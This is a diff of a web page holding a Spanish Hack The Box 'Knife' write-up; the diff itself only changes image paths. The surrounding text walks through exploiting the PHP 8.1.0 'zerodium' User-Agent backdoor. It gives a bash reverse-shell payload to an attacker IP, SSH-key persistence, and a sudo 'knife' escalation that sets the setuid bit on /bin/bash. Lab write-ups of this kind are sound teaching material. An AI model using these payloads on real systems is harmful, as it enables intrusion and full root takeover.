@@ -75,41 +75,41 @@
 <p> Si procedemos a ver la pagina web nos encontramos ante una pagina web de un hospital</p>
 <p><img src="/img/htb-knife/4.PNG" /></p>
 <p> Si buscamos si alguna version de las anteriores es vulnerable vamos a ver que PHP 8.1.0 es vulnerable a Remote Code Execution , por lo que vamos a tener capacidad de Ejecucion de Codigo Remoto</p>
-<p><img src="../../../../img/htb-knife/6.PNG" /></p>
+<p><img src="/img/htb-knife/6.PNG" /></p>
 <h2 id="php">## Explotacion PHP - User Agent:</h2>
 <p>Esta vulnerabilidad esta basada en las cabeceras del User Agent , que vamos a poder ser capaces de poder ejecutar comandos , para ello vamos hacer una prueba mediante curl y pasandole como parametro de sistema un comando id</p>
-<p><img src="../../../../img/htb-knife/7.PNG" /></p>
+<p><img src="/img/htb-knife/7.PNG" /></p>
 <p> Podemos ver que en las cabeceras nos devuelve el resultado de la ejecucion del comando id , y nos devuelve que es el usuario "james" , ya tenemos un usuario potencial para poder acceder al servicio ssh</p>
 <p> Para mayor comodidad vamos a proceder a usar la herramienta Burp Suite para capturar la peticion de la pagina web y lo enviaremos al Repeater , donde para realizar otra prueba vamos a intentar realizar una operacion matematica</p>
-<p><img src="../../../../img/htb-knife/9.PNG" /></p>
+<p><img src="/img/htb-knife/9.PNG" /></p>
 <p>Mediante el User Agent le vamos a pasar como parametro que nos dumpee el resultado de 2x3 , si le damos a enviar la peticion , vamos a poder ver el resultado en la respuesta del servidor.</p>
 <p>Como podemos ver tenemos ejecucion remota de comandos , por lo que va a ser tan facil como ejecutar una shell reversa a nuestro equipo para obtener acceso a la maquina</p>
 <code>User-Agentt: zerodiumsystem("/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.50/443 0>&1'");</code>
-<p><img src="../../../../img/htb-knife/11.PNG" /></p>
+<p><img src="/img/htb-knife/11.PNG" /></p>
 <p> Y nos vamos a poner a la escucha mediante Netcat por el puerto 443, cuando enviemos la peticion mediante Burp Suite obtendremos la shell reversa</p>
-<p><img src="../../../../img/htb-knife/12.PNG" /></p>
+<p><img src="/img/htb-knife/12.PNG" /></p>
 <h2 id="user.txt">## User.txt:</h2>
 <p>Una vez tenemos acceso a la maquina ya podemos visualizar el flag del usuario</p>
-<p><img src="../../../../img/htb-knife/13.PNG" /></p>
+<p><img src="/img/htb-knife/13.PNG" /></p>
 <h2 id="ssh">## SSH:</h2>
 <p> Ahora nos queda visualizar la flag de root , para ello necesitamos escalar privilegios del usuario james al usuario , podemos probar si tenemos permiso para crear una llave de clave publica mediante ssh , para ello vamos a dirigirnos al directorio .shh  </p>
 <code> ssh-keygen</code>
 <p> Vamos a poder generar una nueva clave publica para poder acceder mediante ssh</p>
-<p><img src="../../../../img/htb-knife/14.PNG" /></p>
+<p><img src="/img/htb-knife/14.PNG" /></p>
 <p>Procedemos a agregar id_rsa.pub dentro de el fichero authorized_keys que debemos crear pasandole como usuario permitido el usuario que tengamos en nuestra maquina atacante</p>
-<p><img src="../../../../img/htb-knife/15.PNG" /></p>
+<p><img src="/img/htb-knife/15.PNG" /></p>
 <p>Ahora ya solo nos queda copiar el id_rsa a la maquina atacante , asignarle los permisos necesarios:</p>
 <code>sudo chmod 600 id_rsa</code>
 <code> ssh -i id_rsa james@10.10.10.242</code>
-<p><img src="../../../../img/htb-knife/16.PNG" /></p>
+<p><img src="/img/htb-knife/16.PNG" /></p>
 <h2 id="escalada-privilegios">## Escalada de Privilegios:</h2>
 <p> Una vez tenemos acceso mediante SSH a la maquina , vamos a lanzar el comando sudo -l en busca de algun proceso con permisos SUID</p>
 <code> sudo -l</code>
-<p><img src="../../../../img/htb-knife/17.PNG" /></p>
+<p><img src="/img/htb-knife/17.PNG" /></p>
 <p> Podemos ver que como el usuario root podemos ejecutar un binario llamado "knife" , si nos vamos a ese directorio vamos a ver que tiene un enlace simbolico que apunta a /opt/chef-workstation</p>
-<p><img src="../../../../img/htb-knife/18.PNG" /></p>
+<p><img src="/img/htb-knife/18.PNG" /></p>
 <p> Si listamos el directorio /opt/chef-workstation , tiene pinta que es el direcotrio de instalacion de ruby </p>
-<p><img src="../../../../img/htb-knife/19.PNG" /></p>
+<p><img src="/img/htb-knife/19.PNG" /></p>
 <p>Podemos ejecutar archivos y comandos de /usr/bin/knife ruby sin el comando ruby , por eso no podemos ejecutar el archivo "ex.rb" que esta en el directorio de James</p>
 <p>Por lo que vamos a ejecutar el fichero ex.rb</p>
 <code> cd /home/james</code>
@@ -156,13 +156,13 @@ james@knife:~$
 <p> Podemos ver que podemos obtener permisos de root ya que hemos podido visualizar el fichero /etc/shadow donde se encuentra las contraseñas hasheadas</p>
 <p> Si creamos un fichero en ruby que nos conceda una consola bash tendriamos esa terminal con permisos de root</p>
 <code>echo "system('chmod +s /bin/bash')" > guarina0x0.rb</code>
-<p><img src="../../../../img/htb-knife/21.PNG" /> </p> 
+<p><img src="/img/htb-knife/21.PNG" /> </p> 
 <p>Vamos a comprobar que se ha creado el fichero ruby</p>
-<p><img src="../../../../img/htb-knife/22.PNG" /> </p> 
+<p><img src="/img/htb-knife/22.PNG" /> </p> 
 <p> Ahora solo nos queda ejecutar ese fichero que hemos creado</p>
-<p><img src="../../../../img/htb-knife/23.PNG" /> </p> 
+<p><img src="/img/htb-knife/23.PNG" /> </p> 
 <p> Ya tendriamos la maquina explotada!!!</p>
-<p><img src="../../../../img/htb-knife/24.PNG" /> </p> 
+<p><img src="/img/htb-knife/24.PNG" /> </p> 
 </article>
 
 <footer>
